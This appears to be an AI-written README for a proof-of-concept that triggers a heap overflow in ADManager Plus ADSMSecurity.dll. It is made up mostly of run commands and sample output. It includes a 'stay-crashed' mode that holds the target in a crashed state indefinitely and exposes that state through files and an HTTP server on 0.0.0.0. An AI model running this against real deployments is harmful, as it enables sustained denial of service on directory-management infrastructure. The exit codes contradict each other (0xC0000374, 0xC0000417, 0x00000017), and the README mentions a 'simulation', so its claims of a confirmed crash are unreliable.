# F4 Crash PoC - ADManager Plus 8043 / ADSMSecurity.dll - Fixed

## Overview
Fixed and runnable version of F4 heap-overflow PoC: `wsprintfW(malloc(0x208), "%s\*.*", path)` at `sub_0x7410+0x74a4` -> `0xC0000374`.

## Final CLI - Stays on Crash State + Observable From Outside

### 1. Stay-Crashed Mode (NEW - your request)
Keeps ADSMSecurity.dll vulnerable path in **permanently crashed state** with external observability:

```bash
# FINAL CLI - stays crashed indefinitely, observable:
python f4_crash_poc.py --stay-crashed --len 1000

# With custom observable files:
python f4_crash_poc.py --stay-crashed --len 1000 --duration 60 \
  --status-file ./f4_crash_state.json \
  --indicator-file ./f4_crashed.lock \
  --keep-alive 2

# With HTTP status server (outside world can curl):
python f4_crash_poc.py --stay-crashed --len 1000 --http-port 8080
# then from outside:
curl http://localhost:8080/
cat f4_crash_state.json
ls -l f4_crashed.lock   # exists = in crash state
```

**What outside world sees:**
- **status-file** (`f4_crash_state.json`): JSON updated every iteration:
  ```json
  {
    "timestamp": "2026-09-06T10:54:59",
    "pid": 1735,
    "in_crash_state": true,
    "stay_crashed": true,
    "total_firings": 11,
    "crashes": 11,
    "crash_rate_percent": 100.0,
    "last_exit_code": "0x00000017",
    "last_exit_name": "HeapValidate FALSE - F4 confirmed",
    "uptime_seconds": 1
  }
  ```
- **indicator-file** (`f4_crashed.lock`): exists while in crash state, contains `CRASH_STATE ACTIVE pid=...`. Outside can `test -f f4_crashed.lock && echo CRASHED`.
- **http-port**: tiny HTTP server on `0.0.0.0:PORT` returns same JSON on `GET /`. Works with Arena preview, curl, monitoring.

### 2. Keep-Alive Hold (previous request)
Keeps child alive holding DLL for N seconds:

```bash
python f4_crash_poc.py --control --keep-alive 10
python f4_crash_poc.py --len 100 --keep-alive 5
python f4_crash_poc.py --len 1000 --keep-alive 5   # holds even when corrupted before crash
```

### 3. Classic Modes
```bash
python f4_crash_poc.py --control
python f4_crash_poc.py --len 100        # safe
python f4_crash_poc.py --len 1000       # crash -> F4 CONFIRMED
python f4_crash_poc.py --sustain --len 1000 --duration 60
```

## Fixes Applied
- Duplicate broken `main()` fixed
- `%s` escaping bug fixed
- POSIX exit truncation handled (23 = 0xC0000417)
- Cross-platform simulation + guards
- Added keep-alive + stay-crashed observable

## Safety
- Non-existent path, throwaway child only, no service touched
- Lab authorized only

## Requirements
Python 3.8+ stdlib only
